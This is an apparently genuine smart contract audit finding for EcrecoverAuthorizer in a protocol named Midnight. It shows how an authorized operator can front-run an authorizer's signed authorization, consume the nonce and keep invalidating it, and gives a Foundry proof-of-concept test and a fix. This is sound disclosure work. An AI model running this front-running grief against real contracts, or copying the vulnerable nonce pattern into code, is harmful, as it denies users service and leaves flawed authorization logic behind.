### Title
Authorized Operator Can Front-Run and Permanently Invalidate Authorizer's Pending Signed Authorization — (`src/periphery/EcrecoverAuthorizer.sol`)

### Summary

`EcrecoverAuthorizer.setIsAuthorized` increments `nonce[authorization.authorizer]` but accepts any signature from an address that `IMidnight.isAuthorized(authorizer, signer)` returns `true` for. Because an already-authorized operator can sign an `Authorization` struct naming the victim as `authorizer` with the victim's current nonce, the operator can front-run the victim's pending transaction, consume the victim's nonce, and cause the victim's transaction to revert with `InvalidNonce()`. The victim's signed message is permanently invalidated since nonces are strictly sequential.

### Finding Description

**Exact code path:**

In `src/periphery/EcrecoverAuthorizer.sol`, `setIsAuthorized` performs two sequential checks:

```solidity
// Line 26
require(authorization.nonce == nonce[authorization.authorizer]++, InvalidNonce());

// Lines 33-36
require(
    signer == authorization.authorizer || IMidnight(MIDNIGHT).isAuthorized(authorization.authorizer, signer),
    Unauthorized()
);
``` [1](#0-0) 

The nonce is consumed on line 26 **before** the signer identity is verified on lines 33–36. More critically, the signer check on line 34 accepts any address for which `isAuthorized[authorization.authorizer][signer] == true` — i.e., any operator the authorizer has previously authorized.

**Attacker-controlled inputs:**

The attacker constructs:
```
Authorization {
    authorizer: victim,       // attacker sets this to victim's address
    authorized: anyAddress,   // arbitrary
    isAuthorized: true,
    nonce: N,                 // victim's current nonce, observed from mempool
    deadline: T               // any valid future timestamp
}
```
The attacker signs this with their own key. Since `isAuthorized[victim][attacker] == true`, the `Unauthorized()` check passes.

**Exploit flow:**

1. Victim signs `Authorization{authorizer=victim, authorized=X, nonce=N, deadline=T}` and broadcasts to mempool.
2. Attacker observes the pending tx, reads `N = nonce[victim]`.
3. Attacker constructs their own `Authorization{authorizer=victim, authorized=Y, nonce=N, deadline=T2}`, signs with attacker's key, submits with higher gas.
4. Attacker's tx executes first: nonce check `N == N` passes, `nonce[victim]` becomes `N+1`, `isAuthorized[victim][Y]` is set.
5. Victim's tx executes: nonce check `N == N+1` fails → `InvalidNonce()` revert.
6. Victim's signed message (with nonce `N`) is permanently invalid. Victim must re-sign with nonce `N+1`, but attacker can repeat indefinitely.

**Why existing checks fail:**

The `Unauthorized()` check at lines 33–36 is designed to prevent strangers from acting on behalf of the authorizer, but it explicitly permits any previously-authorized operator. There is no check that the signer must be the authorizer themselves when consuming the authorizer's nonce. The nonce increment at line 26 is unconditional and happens before signer verification. ### Impact Explanation

Any authorized operator can permanently invalidate any pending signed authorization message from the authorizer by front-running with a higher-gas transaction that consumes the same nonce. The attacker can repeat this for every new nonce the victim signs, creating an indefinite DoS on the `EcrecoverAuthorizer` flow. If the victim needs to establish or revoke an authorization via a signed message (e.g., for a time-sensitive gate-restricted operation with a deadline), they are locked out of that path. Note: the victim retains the ability to call `Midnight.setIsAuthorized` directly as `msg.sender`, but the signed-message delegation path is fully griefable. [4](#0-3) 

### Likelihood Explanation

**Preconditions:** `isAuthorized[victim][attacker] == true` — the attacker must have been previously authorized by the victim. This is a normal protocol state (e.g., victim authorized a keeper, relayer, or another user). **Feasibility:** Mempool front-running is standard on non-private mempools. The attacker only needs to observe the victim's pending tx and submit with higher gas. **Repeatability:** The attack is repeatable for every nonce the victim signs, making it a persistent DoS with no natural termination. The only escape for the victim is to revoke the attacker's authorization via a direct `Midnight.setIsAuthorized` call (not via EcrecoverAuthorizer), then re-sign.

### Recommendation

Restrict the signer in `EcrecoverAuthorizer.setIsAuthorized` to be exclusively `authorization.authorizer` — do not permit delegates to sign on behalf of the authorizer. The delegation check (`isAuthorized`) should be removed from this function, since the purpose of the EcrecoverAuthorizer is to let the authorizer themselves sign off-chain:

```solidity
// Replace lines 33-36 with:
require(signer == authorization.authorizer, Unauthorized());
```

Alternatively, if delegate signing is intentional, key the nonce on the **signer** rather than the **authorizer**, so a delegate's submission only increments the delegate's own nonce and cannot invalidate the authorizer's pending messages.

### Proof of Concept

```solidity
// Foundry unit test
function testFrontRunNonceGrief() public {
    // Setup: victim authorizes attacker on Midnight directly
    vm.prank(victim);
    midnight.setIsAuthorized(address(ecrecoverAuthorizer), true, victim);
    vm.prank(victim);
    midnight.setIsAuthorized(attacker, true, victim);

    // Victim signs Authorization with nonce=0
    Authorization memory victimAuth = Authorization({
        authorizer: victim,
        authorized: someGate,
        isAuthorized: true,
        nonce: 0,
        deadline: block.timestamp + 1 days
    });
    Signature memory victimSig = signAuthorization(victimAuth, victimPrivKey);

    // Attacker front-runs: signs a different Authorization with same nonce=0
    Authorization memory attackerAuth = Authorization({
        authorizer: victim,       // victim as authorizer
        authorized: attacker,     // arbitrary target
        isAuthorized: true,
        nonce: 0,                 // same nonce
        deadline: block.timestamp + 1 days
    });
    Signature memory attackerSig = signAuthorization(attackerAuth, attackerPrivKey);

    // Attacker submits first (higher gas in practice)
    ecrecoverAuthorizer.setIsAuthorized(attackerAuth, attackerSig);
    assertEq(ecrecoverAuthorizer.nonce(victim), 1); // nonce consumed

    // Victim's tx now reverts
    vm.expectRevert(IEcrecoverAuthorizer.InvalidNonce.selector);
    ecrecoverAuthorizer.setIsAuthorized(victimAuth, victimSig);

    // Assert: victim's signed message is permanently invalid
    assertEq(midnight.isAuthorized(victim, someGate), false);
}
```

**Expected assertions:** The `vm.expectRevert(InvalidNonce.selector)` passes, confirming the victim's signed message is permanently invalidated. The final `assertEq` confirms the intended authorization was never established.

    function setIsAuthorized(Authorization memory authorization, Signature calldata signature) external {
        require(block.timestamp <= authorization.deadline, Expired());
        require(authorization.nonce == nonce[authorization.authorizer]++, InvalidNonce());

        bytes32 hashStruct = keccak256(abi.encode(AUTHORIZATION_TYPEHASH, authorization));
        bytes32 domainSeparator = keccak256(abi.encode(EIP712_DOMAIN_TYPEHASH, block.chainid, address(this)));
        bytes32 digest = keccak256(bytes.concat("\x19\x01", domainSeparator, hashStruct));
        address signer = ecrecover(digest, signature.v, signature.r, signature.s);
        require(signer != address(0), InvalidSignature());
        require(
            signer == authorization.authorizer || IMidnight(MIDNIGHT).isAuthorized(authorization.authorizer, signer),
            Unauthorized()
        );
